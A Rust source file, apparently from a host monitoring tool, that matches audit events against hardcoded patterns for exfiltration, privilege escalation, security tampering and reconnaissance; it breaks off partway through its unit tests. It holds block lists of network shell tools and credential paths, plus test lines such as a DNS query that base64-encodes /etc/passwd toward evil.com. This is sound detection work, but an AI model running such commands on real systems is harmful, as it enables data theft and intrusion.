//! Hardcoded behavioral threat detection engine.
//!
//! Classifies parsed audit events against ~200 static patterns organized into
//! categories: data exfiltration, privilege escalation, security tampering,
//! reconnaissance, and side-channel attacks.
//!
//! Patterns include network exfil tools, DNS tunneling, container escapes,
//! LD_PRELOAD bypasses, SSH key injection, history tampering, log clearing,
//! binary replacement, and more. Build-tool child processes (cargo, gcc, etc.)
//! are allowlisted to reduce false positives.
//!
//! This is the "hardcoded" detection layer — for user-configurable rules,
//! see the `policy` module.

use std::fmt;

use crate::alerts::Severity;
use crate::auditd::ParsedEvent;

/// Categories of suspicious behavior detected by the hardcoded rules engine.
///
/// Each category maps to a class of attack technique (MITRE ATT&CK inspired).
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum BehaviorCategory {
    DataExfiltration,
    PrivilegeEscalation,
    SecurityTamper,
    Reconnaissance,
    SideChannel,
    #[allow(dead_code)]
    SecureClawMatch,
}

impl fmt::Display for BehaviorCategory {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            BehaviorCategory::DataExfiltration => write!(f, "DATA_EXFIL"),
            BehaviorCategory::PrivilegeEscalation => write!(f, "PRIV_ESC"),
            BehaviorCategory::SecurityTamper => write!(f, "SEC_TAMPER"),
            BehaviorCategory::Reconnaissance => write!(f, "RECON"),
            BehaviorCategory::SideChannel => write!(f, "SIDE_CHAN"),
            BehaviorCategory::SecureClawMatch => write!(f, "SC_MATCH"),
        }
    }
}

/// Sensitive files that should never be read by the watched user
const CRITICAL_READ_PATHS: &[&str] = &[
    "/etc/shadow",
    "/etc/sudoers",
    "/etc/gshadow",
    "/etc/master.passwd",
    "/proc/kcore",
    "/proc/self/environ",
    "/proc/1/environ",
];

/// Sensitive files that should never be written by the watched user
const CRITICAL_WRITE_PATHS: &[&str] = &[
    "/etc/passwd",
    "/etc/hosts",
    "/etc/crontab",
    "/etc/sudoers",
    "/etc/shadow",
    "/etc/rc.local",
    "/etc/ld.so.preload",
];

/// Reconnaissance-indicative file paths
const RECON_PATHS: &[&str] = &[
    ".env",
    ".aws/credentials",
    ".aws/config",
    ".ssh/id_rsa",
    ".ssh/id_ed25519",
    ".ssh/config",
    ".ssh/known_hosts",
    ".gnupg/",
    ".kube/config",
    "/proc/kallsyms",
    "/sys/devices/system/cpu/vulnerabilities/",
    "/proc/self/cmdline",
    "/proc/self/maps",
    "/proc/self/status",
];

/// Network exfiltration tools
const EXFIL_COMMANDS: &[&str] = &["curl", "wget", "nc", "ncat", "netcat", "socat"];

/// DNS exfiltration tools
const DNS_EXFIL_COMMANDS: &[&str] = &["dig", "nslookup", "host", "drill", "resolvectl"];

/// Security-disabling commands (matched as substrings of full command)
const SECURITY_TAMPER_PATTERNS: &[&str] = &[
    "ufw disable",
    "iptables -f",
    "iptables --flush",
    "iptables -F",
    "nft flush",
    "systemctl stop apparmor",
    "systemctl disable apparmor",
    "systemctl stop auditd",
    "systemctl disable auditd",
    "systemctl stop clawav",
    "systemctl disable clawav",
    "systemctl stop samhain",
    "systemctl disable samhain",
    "systemctl stop fail2ban",
    "systemctl disable fail2ban",
    "aa-teardown",
    "setenforce 0",
];

/// Recon commands
const RECON_COMMANDS: &[&str] = &["whoami", "id", "uname", "env", "printenv", "hostname", "ifconfig"];

/// Commands that look like recon but are normal system operations — skip detection
const RECON_ALLOWLIST: &[&str] = &["ip neigh", "ip addr", "ip route", "ip link"];

/// Side-channel attack tools
const SIDECHANNEL_TOOLS: &[&str] = &["mastik", "flush-reload", "prime-probe", "sgx-step", "cache-attack"];

/// Container escape command patterns
const CONTAINER_ESCAPE_PATTERNS: &[&str] = &[
    "nsenter",
    "unshare",
    "mount /",
    "--privileged",
    "/proc/1/root",
    "/proc/sysrq-trigger",
    "/.dockerenv",
    "/var/run/docker.sock",
    "docker.sock",
    "cgroup release_agent",
];

/// Container escape binaries
const CONTAINER_ESCAPE_BINARIES: &[&str] = &["nsenter", "unshare", "runc", "ctr", "crictl"];

/// Persistence-related binaries
const PERSISTENCE_BINARIES: &[&str] = &["crontab", "at", "atq", "atrm", "batch"];

/// Persistence-related write paths
const PERSISTENCE_WRITE_PATHS: &[&str] = &[
    "/etc/cron",          // covers cron.d, cron.daily, cron.hourly, etc.
    "/var/spool/cron",
    "/var/spool/at",
    "/etc/rc.local",
    "/etc/init.d/",
    "/etc/systemd/system/",
    "/usr/lib/systemd/system/",
    "/etc/profile.d/",
    "/etc/ld.so.preload",
];

/// Patterns that indicate LD_PRELOAD bypass attempts
const PRELOAD_BYPASS_PATTERNS: &[&str] = &[
    "ld.so.preload",
    "LD_PRELOAD",
    "LD_LIBRARY_PATH",
    "ld-linux",
    "/lib/ld-",
];

/// Tools commonly used to compile static binaries or bypass dynamic linking
const STATIC_COMPILE_PATTERNS: &[&str] = &[
    "-static",
    "-static-libgcc",
    "musl-gcc",
    "musl-cc",
];

/// SSH key injection patterns
const SSH_KEY_INJECTION_PATTERNS: &[&str] = &[
    ".ssh/authorized_keys",
    "/root/.ssh/authorized_keys",
    "/home/*/ssh/authorized_keys",
];

/// History tampering patterns
const HISTORY_TAMPER_PATTERNS: &[&str] = &[
    ".bash_history",
    ".zsh_history",
    ".history",
    "HISTSIZE=0",
    "HISTFILESIZE=0",
    "unset HISTFILE",
];

/// Process injection patterns  
const PROCESS_INJECTION_PATTERNS: &[&str] = &[
    "ptrace",
    "/proc/*/mem",
    "/proc/*/maps",
    "PTRACE_ATTACH",
    "PTRACE_POKETEXT",
];

/// Timestomping patterns
const TIMESTOMPING_PATTERNS: &[&str] = &[
    "touch -t",
    "touch --date",
    "touch -d",
    "touch -r",
];

/// Log clearing patterns
const LOG_CLEARING_PATTERNS: &[&str] = &[
    "> /var/log/",
    "truncate /var/log/",
    "rm /var/log/",
    "> /var/log/syslog",
    "> /var/log/auth.log",
    "> /var/log/audit/audit.log",
    "journalctl --vacuum",
    "journalctl --rotate",
];

/// Binary replacement patterns
const BINARY_REPLACEMENT_PATTERNS: &[&str] = &[
    "/usr/bin/",
    "/usr/sbin/", 
    "/bin/",
    "/sbin/",
];

/// Kernel parameter modification patterns
const KERNEL_PARAM_PATTERNS: &[&str] = &[
    "sysctl -w",
    "echo > /proc/sys/",
    "/proc/sys/kernel/",
    "/proc/sys/net/",
];

/// Service creation patterns
const SERVICE_CREATION_PATTERNS: &[&str] = &[
    "systemctl enable",
    "systemctl start", 
    "/etc/systemd/system/",
    "/usr/lib/systemd/system/",
    "/etc/init.d/",
    "update-rc.d",
    "chkconfig",
];

/// Network tunnel creation patterns
const TUNNEL_CREATION_PATTERNS: &[&str] = &[
    "ssh -R",
    "ssh -L",
    "ssh -D",
    "chisel",
    "ngrok",
    "socat",
    "proxytunnel",
    "stunnel",
];

/// Package manager abuse patterns
const PACKAGE_MANAGER_ABUSE_PATTERNS: &[&str] = &[
    "pip install",
    "npm install",
    "gem install",
    "go get",
    "cargo install",
    "easy_install",
];

/// Compiler invocation patterns (could be building exploits)
const COMPILER_PATTERNS: &[&str] = &[
    "gcc",
    "g++",
    "clang",
    "cc",
    "make",
    "cmake",
    "rustc",
    "go build",
];

/// Memory dump tools
const MEMORY_DUMP_PATTERNS: &[&str] = &[
    "gdb attach",
    "gdb -p",
    "lldb -p",
    "/proc/kcore",
    "dd if=/proc/kcore",
    "volatility",
    "memdump",
];

/// Scheduled task manipulation patterns
const SCHEDULED_TASK_BINARIES: &[&str] = &[
    "at",
    "atq", 
    "atrm",
    "batch",
    "crontab",
];

/// Encoding/obfuscation tools (excluding common file readers like cat)
const ENCODING_TOOLS: &[&str] = &[
    "xxd",
    "od",
    "hexdump", 
    "base64",
    "base32",
    "uuencode",
];

/// File extensions that are suspicious when created in temp directories
const SUSPICIOUS_TEMP_EXTENSIONS: &[&str] = &[
    ".elf",
    ".so",
    ".bin",
    ".exe",
    ".dll",
    ".dylib",
];

/// Large file exfiltration patterns
const LARGE_FILE_EXFIL_PATTERNS: &[&str] = &[
    "tar -czf",
    "tar -cf", 
    "zip -r",
    "7z a",
    "gzip",
    "bzip2",
];

/// AWS credential theft patterns
const AWS_CREDENTIAL_PATTERNS: &[&str] = &[
    "aws sts get-session-token",
    "aws sts assume-role",
    "aws configure get",
    "aws configure list",
    ".aws/credentials",
    ".aws/config",
];

/// Git credential exposure patterns
const GIT_CREDENTIAL_PATTERNS: &[&str] = &[
    "git config credential",
    "git config user.token",
    "git config --global credential",
    ".git/config",
    ".gitconfig",
];

/// Build tools whose child processes should not trigger SEC_TAMPER for linker activity
const BUILD_TOOL_BASES: &[&str] = &[
    "cargo", "rustc", "cc", "cc1", "cc1plus", "gcc", "g++",
    "collect2", "ld", "make", "cmake", "ninja", "as",
];

/// Classify a parsed audit event against known attack patterns.
/// Returns Some((category, severity)) if the event matches a rule, None otherwise.
pub fn classify_behavior(event: &ParsedEvent) -> Option<(BehaviorCategory, Severity)> {
    // Check raw audit record for LD_PRELOAD environment variable injection.
    // This catches `LD_PRELOAD=/tmp/evil.so ls` where the env var is set
    // before the command but may not appear in the parsed command args.
    if !event.raw.is_empty() && event.raw.contains("LD_PRELOAD=") {
        // Don't flag ClawAV's own guard or build tools
        if !event.raw.contains("clawav") && !event.raw.contains("clawguard") {
            let raw_binary = event.args.first().map(|s| {
                s.rsplit('/').next().unwrap_or(s).to_string()
            }).unwrap_or_default();
            if !BUILD_TOOL_BASES.iter().any(|t| raw_binary.starts_with(t)) {
                // Check parent too
                let parent_suppressed = if let Some(ref ppid_exe) = event.ppid_exe {
                    let parent_base = ppid_exe.rsplit('/').next().unwrap_or(ppid_exe);
                    BUILD_TOOL_BASES.iter().any(|t| parent_base.starts_with(t))
                } else {
                    false
                };
                if !parent_suppressed {
                    return Some((BehaviorCategory::SecurityTamper, Severity::Critical));
                }
            }
        }
    }

    // Check EXECVE events with actual commands
    if let Some(ref cmd) = event.command {
        let cmd_lower = cmd.to_lowercase();
        let args = &event.args;
        let binary = args.first().map(|s| {
            // Extract basename from full path
            s.rsplit('/').next().unwrap_or(s)
        }).unwrap_or("");

        // --- CRITICAL: Security Tamper ---
        // Match against both original and lowercased (some flags are case-sensitive like -F)
        for pattern in SECURITY_TAMPER_PATTERNS {
            if cmd_lower.contains(pattern) || cmd.contains(pattern) {
                return Some((BehaviorCategory::SecurityTamper, Severity::Critical));
            }
        }

        // --- CRITICAL: Persistence mechanisms ---
        if PERSISTENCE_BINARIES.iter().any(|&c| binary.eq_ignore_ascii_case(c)) {
            // crontab -l is read-only listing, not a modification
            if binary.eq_ignore_ascii_case("crontab") && args.iter().any(|a| a == "-l") {
                // Skip — listing crontabs is harmless
            } else {
                return Some((BehaviorCategory::SecurityTamper, Severity::Critical));
            }
        }

        // systemd timer/service creation
        if binary == "systemctl" && args.iter().any(|a| a == "enable" || a == "start") {
            // Enabling/starting arbitrary services could be persistence
            return Some((BehaviorCategory::SecurityTamper, Severity::Warning));
        }

        // --- CRITICAL: Container escape attempts ---
        if CONTAINER_ESCAPE_BINARIES.iter().any(|&c| binary.eq_ignore_ascii_case(c)) {
            return Some((BehaviorCategory::PrivilegeEscalation, Severity::Critical));
        }

        // Check command string for container escape patterns
        if let Some(ref cmd) = event.command {
            for pattern in CONTAINER_ESCAPE_PATTERNS {
                if cmd.contains(pattern) {
                    return Some((BehaviorCategory::PrivilegeEscalation, Severity::Critical));
                }
            }
        }

        // --- CRITICAL: LD_PRELOAD bypass attempts ---
        if let Some(ref cmd) = event.command {
            // Direct manipulation of preload config
            for pattern in PRELOAD_BYPASS_PATTERNS {
                if cmd.contains(pattern) {
                    // Don't flag our own legitimate preload operations
                    if !cmd.contains("clawav") && !cmd.contains("clawguard") {
                        // Don't flag normal compiler/linker invocations
                        if ["ld", "collect2", "cc1", "cc1plus", "gcc", "g++", "rustc", "cc"].contains(&binary) {
                            // Normal compilation — linker uses -dynamic-linker /lib/ld-linux-*.so.1
                            // This is not an LD_PRELOAD bypass
                        } else if let Some(ref ppid_exe) = event.ppid_exe {
                            let parent_base = ppid_exe.rsplit('/').next().unwrap_or(ppid_exe);
                            if BUILD_TOOL_BASES.iter().any(|t| parent_base.starts_with(t)) {
                                // Parent is a build tool — suppress
                            } else {
                                return Some((BehaviorCategory::SecurityTamper, Severity::Critical));
                            }
                        } else {
                            return Some((BehaviorCategory::SecurityTamper, Severity::Critical));
                        }
                    }
                }
            }
            
            // Compiling static binaries to bypass dynamic linking
            for pattern in STATIC_COMPILE_PATTERNS {
                if cmd.contains(pattern) {
                    // Suppress if the binary itself is a build tool or parent is a build tool
                    if BUILD_TOOL_BASES.iter().any(|t| binary.starts_with(t)) {
                        break; // Normal compilation flag, not an attack
                    }
                    if let Some(ref ppid_exe) = event.ppid_exe {
                        let parent_base = ppid_exe.rsplit('/').next().unwrap_or(ppid_exe);
                        if BUILD_TOOL_BASES.iter().any(|t| parent_base.starts_with(t)) {
                            break; // Parent is a build tool — suppress
                        }
                    }
                    return Some((BehaviorCategory::SecurityTamper, Severity::Warning));
                }
            }
        }

        // Direct invocation of the dynamic linker (bypass LD_PRELOAD)
        if binary == "ld-linux-aarch64.so.1" || binary == "ld-linux-x86-64.so.2" || binary.starts_with("ld-linux") || binary == "ld.so" {
            if let Some(ref ppid_exe) = event.ppid_exe {
                let parent_base = ppid_exe.rsplit('/').next().unwrap_or(ppid_exe);
                if BUILD_TOOL_BASES.iter().any(|t| parent_base.starts_with(t)) {
                    return None; // Build tool spawned the linker — not an attack
                }
            }
            return Some((BehaviorCategory::SecurityTamper, Severity::Critical));
        }

        // ptrace can be used to bypass LD_PRELOAD by injecting code directly
        if ["strace", "ltrace", "gdb", "lldb", "ptrace"].contains(&binary) {
            return Some((BehaviorCategory::SecurityTamper, Severity::Critical));
        }

        // --- CRITICAL: SSH key injection ---
        if ["tee", "echo", "cp", "mv"].contains(&binary) {  // Exclude "cat" since that's typically reading, not injecting
            for arg in args.iter().skip(1) {
                for pattern in SSH_KEY_INJECTION_PATTERNS {
                    if arg.contains(pattern) {
                        return Some((BehaviorCategory::PrivilegeEscalation, Severity::Critical));
                    }
                }
            }
        }

        // --- CRITICAL: History tampering ---
        if ["rm", "mv", "cp", ">", "truncate", "unset", "export"].contains(&binary) ||
           cmd_lower.contains("histsize=0") || cmd_lower.contains("histfilesize=0") {
            for pattern in HISTORY_TAMPER_PATTERNS {
                if cmd.contains(pattern) {
                    return Some((BehaviorCategory::SecurityTamper, Severity::Critical));
                }
            }
        }

        // --- CRITICAL: Process injection via ptrace or /proc manipulation ---
        if let Some(ref cmd) = event.command {
            for pattern in PROCESS_INJECTION_PATTERNS {
                if cmd.contains(pattern) {
                    return Some((BehaviorCategory::PrivilegeEscalation, Severity::Critical));
                }
            }
        }

        // --- WARNING: Timestomping ---
        if binary == "touch" {
            for pattern in TIMESTOMPING_PATTERNS {
                if cmd.contains(pattern) {
                    return Some((BehaviorCategory::SecurityTamper, Severity::Warning));
                }
            }
        }

        // --- CRITICAL: Log clearing ---
        if let Some(ref cmd) = event.command {
            for pattern in LOG_CLEARING_PATTERNS {
                if cmd.contains(pattern) {
                    return Some((BehaviorCategory::SecurityTamper, Severity::Critical));
                }
            }
        }

        // --- CRITICAL: Binary replacement in system directories ---
        if ["cp", "mv", "install", "dd"].contains(&binary) {
            for arg in args.iter().skip(1) {
                for pattern in BINARY_REPLACEMENT_PATTERNS {
                    if arg.starts_with(pattern) && args.len() > 2 {
                        return Some((BehaviorCategory::SecurityTamper, Severity::Critical));
                    }
                }
            }
        }

        // --- WARNING: Kernel parameter changes ---
        if binary == "sysctl" || cmd.contains("echo > /proc/sys/") {
            for pattern in KERNEL_PARAM_PATTERNS {
                if cmd.contains(pattern) {
                    return Some((BehaviorCategory::SecurityTamper, Severity::Warning));
                }
            }
        }

        // --- WARNING: Service creation/modification ---
        if binary == "systemctl" {
            for pattern in SERVICE_CREATION_PATTERNS {
                if cmd.contains(pattern) && !cmd.contains("clawav") {
                    return Some((BehaviorCategory::SecurityTamper, Severity::Warning));
                }
            }
        }

        // --- CRITICAL: Network tunnel creation ---
        for pattern in TUNNEL_CREATION_PATTERNS {
            if binary.contains(pattern) || cmd.contains(pattern) {
                return Some((BehaviorCategory::DataExfiltration, Severity::Critical));
            }
        }

        // --- WARNING: Package manager abuse ---
        for pattern in PACKAGE_MANAGER_ABUSE_PATTERNS {
            if cmd.contains(pattern) {
                // Check if installing from suspicious sources
                if cmd.contains("git+") || cmd.contains("http://") || cmd.contains("--index-url") {
                    return Some((BehaviorCategory::SecurityTamper, Severity::Warning));
                }
            }
        }

        // --- WARNING: Compiler invocation (could be building exploits) ---
        for pattern in COMPILER_PATTERNS {
            if binary == *pattern || cmd.contains(pattern) {
                // Suppress if parent is a build tool (normal compilation)
                if let Some(ref ppid_exe) = event.ppid_exe {
                    let parent_base = ppid_exe.rsplit('/').next().unwrap_or(ppid_exe);
                    if BUILD_TOOL_BASES.iter().any(|t| parent_base.starts_with(t)) {
                        break; // Normal build process
                    }
                }
                // More suspicious if compiling from /tmp or with network code
                if args.iter().any(|a| a.contains("/tmp/") || a.contains("socket") || a.contains("network")) {
                    return Some((BehaviorCategory::SecurityTamper, Severity::Warning));
                }
                return Some((BehaviorCategory::Reconnaissance, Severity::Info));
            }
        }

        // --- CRITICAL: Memory dump tools ---
        for pattern in MEMORY_DUMP_PATTERNS {
            if cmd.contains(pattern) {
                return Some((BehaviorCategory::DataExfiltration, Severity::Critical));
            }
        }

        // --- WARNING: Scheduled task manipulation ---
        for pattern in SCHEDULED_TASK_BINARIES {
            if binary == *pattern {
                // crontab -l is read-only listing, not manipulation
                if binary == "crontab" && args.iter().any(|a| a == "-l") {
                    continue;
                }
                return Some((BehaviorCategory::SecurityTamper, Severity::Warning));
            }
        }

        // --- WARNING: Encoding/obfuscation tools used on files ---
        for pattern in ENCODING_TOOLS {
            if binary == *pattern && args.len() > 1 {
                // Only flag if being used with suspicious piping or on sensitive files with encoding intent
                if cmd.contains("| curl") || cmd.contains("| wget") || cmd.contains("| nc") ||
                   (args.iter().any(|a| a.contains("/proc/")) && cmd.contains("|")) {
                    return Some((BehaviorCategory::DataExfiltration, Severity::Warning));
                }
            }
        }

        // --- WARNING: Large file exfiltration ---
        for pattern in LARGE_FILE_EXFIL_PATTERNS {
            if cmd.contains(pattern) {
                // Check if targeting sensitive directories
                if args.iter().any(|a| a.contains("/etc") || a.contains("/var") || a.contains("/home")) {
                    return Some((BehaviorCategory::DataExfiltration, Severity::Warning));
                }
            }
        }

        // --- WARNING: AWS credential theft ---
        for pattern in AWS_CREDENTIAL_PATTERNS {
            if cmd.contains(pattern) {
                return Some((BehaviorCategory::DataExfiltration, Severity::Warning));
            }
        }

        // --- WARNING: Git credential exposure ---
        for pattern in GIT_CREDENTIAL_PATTERNS {
            if cmd.contains(pattern) {
                return Some((BehaviorCategory::DataExfiltration, Severity::Warning));
            }
        }

        // --- CRITICAL: Data Exfiltration via network tools ---
        // Skip if target is a known-safe host
        const SAFE_HOSTS: &[&str] = &[
            "gottamolt.gg", "mahamedia.us", "localhost", "127.0.0.1",
            "api.anthropic.com", "api.openai.com", "github.com",
            "hooks.slack.com", "amazonaws.com", "registry.npmjs.org",
            "crates.io", "pypi.org", "api.brave.com", "wttr.in",
        ];
        if EXFIL_COMMANDS.iter().any(|&c| binary.eq_ignore_ascii_case(c)) {
            let full_cmd_lower = args.join(" ").to_lowercase();
            let is_safe = SAFE_HOSTS.iter().any(|&h| full_cmd_lower.contains(h));
            if !is_safe {
                return Some((BehaviorCategory::DataExfiltration, Severity::Critical));
            }
        }

        // --- DNS exfiltration — tools that can encode data in DNS queries ---
        if DNS_EXFIL_COMMANDS.iter().any(|&c| binary.eq_ignore_ascii_case(c)) {
            // Check if any arg looks like encoded data (long subdomains, base64 patterns)
            let suspicious = args.iter().skip(1).any(|arg| {
                // Long hostnames with many dots (data chunked across labels)
                let dot_count = arg.matches('.').count();
                let has_long_labels = arg.split('.').any(|label| label.len() > 25);
                // Or contains shell substitution / piping
                let has_subshell = arg.contains('$') || arg.contains('`');
                (dot_count > 4 && has_long_labels) || has_subshell || dot_count > 6
            });
            if suspicious {
                return Some((BehaviorCategory::DataExfiltration, Severity::Critical));
            }
            // Even non-suspicious DNS lookups by the agent are worth noting
            return Some((BehaviorCategory::Reconnaissance, Severity::Info));
        }

        // --- Scripted DNS exfiltration ---
        if ["python", "python3", "node", "ruby", "perl"].contains(&binary) {
            if let Some(ref cmd) = event.command {
                let cmd_lower = cmd.to_lowercase();
                if cmd_lower.contains("getaddrinfo") || cmd_lower.contains("dns.resolve") || 
                   cmd_lower.contains("socket.gethostbyname") || cmd_lower.contains("resolver") {
                    return Some((BehaviorCategory::DataExfiltration, Severity::Critical));
                }
            }
        }

        // --- CRITICAL: Side-channel attack tools ---
        if SIDECHANNEL_TOOLS.iter().any(|&c| binary.eq_ignore_ascii_case(c)) {
            return Some((BehaviorCategory::SideChannel, Severity::Critical));
        }

        // --- CRITICAL: Reading sensitive files ---
        if ["cat", "less", "more", "head", "tail", "xxd", "base64", "cp", "scp"].contains(&binary) {
            for arg in args.iter().skip(1) {
                for path in CRITICAL_READ_PATHS {
                    if arg.contains(path) {
                        return Some((BehaviorCategory::PrivilegeEscalation, Severity::Critical));
                    }
                }
            }
        }

        // --- CRITICAL: Writing to sensitive files ---
        if ["tee", "cp", "mv", "install"].contains(&binary) {
            for arg in args.iter().skip(1) {
                for path in CRITICAL_WRITE_PATHS {
                    if arg.contains(path) {
                        return Some((BehaviorCategory::PrivilegeEscalation, Severity::Critical));
                    }
                }
            }
        }

        // --- CRITICAL: Editors on sensitive files ---
        if ["vi", "vim", "nano", "sed", "ed"].contains(&binary) {
            for arg in args.iter().skip(1) {
                for path in CRITICAL_WRITE_PATHS {
                    if arg.contains(path) {
                        return Some((BehaviorCategory::PrivilegeEscalation, Severity::Critical));
                    }
                }
            }
        }

        // --- WARNING: Reconnaissance commands ---
        // Skip if the full command matches our allowlist of normal operations
        let full_cmd_lower = args.join(" ").to_lowercase();
        let is_allowed = RECON_ALLOWLIST.iter().any(|&a| full_cmd_lower.contains(a));
        if !is_allowed && RECON_COMMANDS.iter().any(|&c| {
            let c_base = c.split_whitespace().next().unwrap_or(c);
            binary.eq_ignore_ascii_case(c_base)
        }) {
            return Some((BehaviorCategory::Reconnaissance, Severity::Warning));
        }

        // --- WARNING: Reading recon-sensitive files ---
        if ["cat", "less", "more", "head", "tail", "cp"].contains(&binary) {
            for arg in args.iter().skip(1) {
                for path in RECON_PATHS {
                    if arg.contains(path) {
                        return Some((BehaviorCategory::Reconnaissance, Severity::Warning));
                    }
                }
            }
        }

        // --- CRITICAL: base64 encoding + suspicious piping ---
        if binary == "base64" {
            // base64 encoding of files is suspicious
            return Some((BehaviorCategory::DataExfiltration, Severity::Warning));
        }

        // --- CRITICAL: Memory/environ dumping tools ---
        if ["strings", "xxd", "od"].contains(&binary) {
            for arg in args.iter().skip(1) {
                if arg.contains("/proc/") && (arg.contains("/environ") || arg.contains("/mem") || arg.contains("/maps")) {
                    return Some((BehaviorCategory::DataExfiltration, Severity::Critical));
                }
            }
        }
    }

    // Check syscall-level events for file access to sensitive paths
    if let Some(ref path) = event.file_path {
        // openat/read on critical files
        if ["openat", "newfstatat", "statx"].contains(&event.syscall_name.as_str()) && event.success {
            for crit_path in CRITICAL_READ_PATHS {
                if path.contains(crit_path) {
                    return Some((BehaviorCategory::PrivilegeEscalation, Severity::Critical));
                }
            }
            for recon_path in RECON_PATHS {
                if path.contains(recon_path) {
                    return Some((BehaviorCategory::Reconnaissance, Severity::Warning));
                }
            }
            for persist_path in &PERSISTENCE_WRITE_PATHS[..] {
                if path.contains(persist_path) {
                    return Some((BehaviorCategory::SecurityTamper, Severity::Warning));
                }
            }
        }

        // unlinkat/renameat on critical files
        if ["unlinkat", "renameat"].contains(&event.syscall_name.as_str()) {
            for crit_path in CRITICAL_WRITE_PATHS {
                if path.contains(crit_path) {
                    return Some((BehaviorCategory::PrivilegeEscalation, Severity::Critical));
                }
            }
            // Persistence via writing to cron/systemd/init paths
            for persist_path in &PERSISTENCE_WRITE_PATHS[..] {
                if path.contains(persist_path) {
                    return Some((BehaviorCategory::SecurityTamper, Severity::Critical));
                }
            }
        }

        // Container escape via socket/proc access
        if ["openat", "newfstatat", "statx", "connect"].contains(&event.syscall_name.as_str()) && event.success {
            let container_escape_paths = ["/var/run/docker.sock", "/proc/1/root", "/proc/sysrq-trigger"];
            for escape_path in &container_escape_paths {
                if path.contains(escape_path) {
                    return Some((BehaviorCategory::PrivilegeEscalation, Severity::Critical));
                }
            }
        }

        // Catch any /proc/*/environ access (not just self/1)
        if path.contains("/proc/") && path.contains("/environ") {
            return Some((BehaviorCategory::DataExfiltration, Severity::Critical));
        }

        // /proc/*/mem access (memory reading)
        if path.contains("/proc/") && path.ends_with("/mem") {
            return Some((BehaviorCategory::DataExfiltration, Severity::Critical));
        }

        // SSH key injection file access
        for pattern in SSH_KEY_INJECTION_PATTERNS {
            if path.contains(pattern) && ["openat", "write", "writev"].contains(&event.syscall_name.as_str()) {
                return Some((BehaviorCategory::PrivilegeEscalation, Severity::Critical));
            }
        }

        // History file tampering
        for pattern in HISTORY_TAMPER_PATTERNS {
            if path.contains(pattern) && ["unlinkat", "truncate", "write"].contains(&event.syscall_name.as_str()) {
                return Some((BehaviorCategory::SecurityTamper, Severity::Critical));
            }
        }

        // Suspicious file creation in /tmp
        if path.starts_with("/tmp/") {
            for ext in SUSPICIOUS_TEMP_EXTENSIONS {
                if path.ends_with(ext) && ["openat", "creat"].contains(&event.syscall_name.as_str()) {
                    return Some((BehaviorCategory::SecurityTamper, Severity::Warning));
                }
            }
        }

        // System binary replacement
        for pattern in BINARY_REPLACEMENT_PATTERNS {
            if path.starts_with(pattern) && ["write", "writev", "renameat"].contains(&event.syscall_name.as_str()) {
                return Some((BehaviorCategory::SecurityTamper, Severity::Critical));
            }
        }

        // Log file tampering
        if path.starts_with("/var/log/") && ["unlinkat", "truncate", "write"].contains(&event.syscall_name.as_str()) {
            return Some((BehaviorCategory::SecurityTamper, Severity::Critical));
        }

        // Service file creation
        if (path.contains("/etc/systemd/system/") || path.contains("/etc/init.d/")) && 
           ["openat", "creat", "write"].contains(&event.syscall_name.as_str()) {
            return Some((BehaviorCategory::SecurityTamper, Severity::Warning));
        }

        // Crontab modification
        if (path.contains("/etc/cron") || path.contains("/var/spool/cron")) && 
           ["openat", "write", "writev"].contains(&event.syscall_name.as_str()) {
            return Some((BehaviorCategory::SecurityTamper, Severity::Critical));
        }
    }

    // perf_event_open can be used for cache timing attacks
    if event.syscall_name == "perf_event_open" {
        return Some((BehaviorCategory::SideChannel, Severity::Warning));
    }

    None
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::auditd::Actor;

    fn make_exec_event(args: &[&str]) -> ParsedEvent {
        ParsedEvent {
            syscall_name: "execve".to_string(),
            command: Some(args.join(" ")),
            args: args.iter().map(|s| s.to_string()).collect(),
            file_path: None,
            success: true,
            raw: String::new(),
            actor: Actor::Unknown,
            ppid_exe: None,
        }
    }

    fn make_exec_event_with_parent(args: &[&str], ppid_exe: &str) -> ParsedEvent {
        ParsedEvent {
            syscall_name: "execve".to_string(),
            command: Some(args.join(" ")),
            args: args.iter().map(|s| s.to_string()).collect(),
            file_path: None,
            success: true,
            raw: String::new(),
            actor: Actor::Unknown,
            ppid_exe: Some(ppid_exe.to_string()),
        }
    }

    fn make_syscall_event(name: &str, path: &str) -> ParsedEvent {
        ParsedEvent {
            syscall_name: name.to_string(),
            command: None,
            args: vec![],
            file_path: Some(path.to_string()),
            success: true,
            raw: String::new(),
            actor: Actor::Unknown,
            ppid_exe: None,
        }
    }

    // --- Data Exfiltration ---

    #[test]
    fn test_curl_is_exfil() {
        let event = make_exec_event(&["curl", "http://evil.com/exfil"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::DataExfiltration, Severity::Critical)));
    }

    #[test]
    fn test_wget_is_exfil() {
        let event = make_exec_event(&["wget", "http://evil.com/payload"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::DataExfiltration, Severity::Critical)));
    }

    #[test]
    fn test_nc_is_exfil() {
        let event = make_exec_event(&["nc", "10.0.0.1", "4444"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::DataExfiltration, Severity::Critical)));
    }

    #[test]
    fn test_full_path_curl_is_exfil() {
        let event = make_exec_event(&["/usr/bin/curl", "-s", "http://evil.com"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::DataExfiltration, Severity::Critical)));
    }

    // --- DNS Exfiltration ---

    #[test]
    fn test_dig_with_encoded_data_is_exfil() {
        let event = make_exec_event(&["dig", "AQAAABABASE64ENCODEDDATA.evil.com.attacker.net.c2.example.com"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::DataExfiltration, Severity::Critical)));
    }

    #[test]
    fn test_dig_with_subshell_is_exfil() {
        let event = make_exec_event(&["dig", "$(cat /etc/passwd | base64).evil.com"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::DataExfiltration, Severity::Critical)));
    }

    #[test]
    fn test_nslookup_normal_is_recon() {
        let event = make_exec_event(&["nslookup", "google.com"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::Reconnaissance, Severity::Info)));
    }

    #[test]
    fn test_python_dns_exfil() {
        let event = make_exec_event(&["python3", "-c", "import socket; socket.gethostbyname('data.evil.com')"]);
        let result = classify_behavior(&event);
        assert_eq!(result, Some((BehaviorCategory::DataExfiltration, Severity::Critical)));
    }

    // --- Privilege Escalation ---

    #[test]
    fn test_cat_etc_shadow() {
